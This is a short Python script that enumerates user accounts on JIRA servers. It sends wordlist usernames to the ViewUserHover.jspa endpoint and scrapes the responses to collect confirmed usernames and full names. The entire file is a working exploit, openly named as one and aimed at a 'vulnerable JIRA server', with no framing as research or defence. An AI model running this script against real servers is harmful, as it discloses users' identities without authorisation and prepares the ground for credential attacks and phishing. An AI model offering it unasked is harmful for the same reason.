import argparse, requests, re

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="url to vulnerable JIRA server", type=str)
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="wordlist with usernames to test")
    args = parser.parse_args()
    if not args.url:
        parser.error("Please specify a vulnerable JIRA server")
    if not args.wordlist:
        parser.error("[-] Please Specify a wordlist containing usernames")
    return args

def show_arguments(options):
    vuln_url = options.url + "/secure/ViewUserHover.jspa?username="
    wordlist = options.wordlist 
    print("vulnurl = " + vuln_url)
    print("wordlist = " + wordlist)
    return vuln_url

def exploit(exploit_url, wordlist):
    f = open(wordlist, "r")
    for username in f:
        r = requests.get(exploit_url + username.strip('\n'))
        pattern = re.compile('<a id="avatar-full-name-link" title=".*" href=".*\n(.*)')
        test = pattern.findall(r.text)
        if test:
            print(test.pop().lstrip() + ":" + username.strip('\n'))

if __name__ == "__main__":
    options = get_arguments()
    exploit_url = show_arguments(options)
    exploit(exploit_url, options.wordlist)
    print("the end")
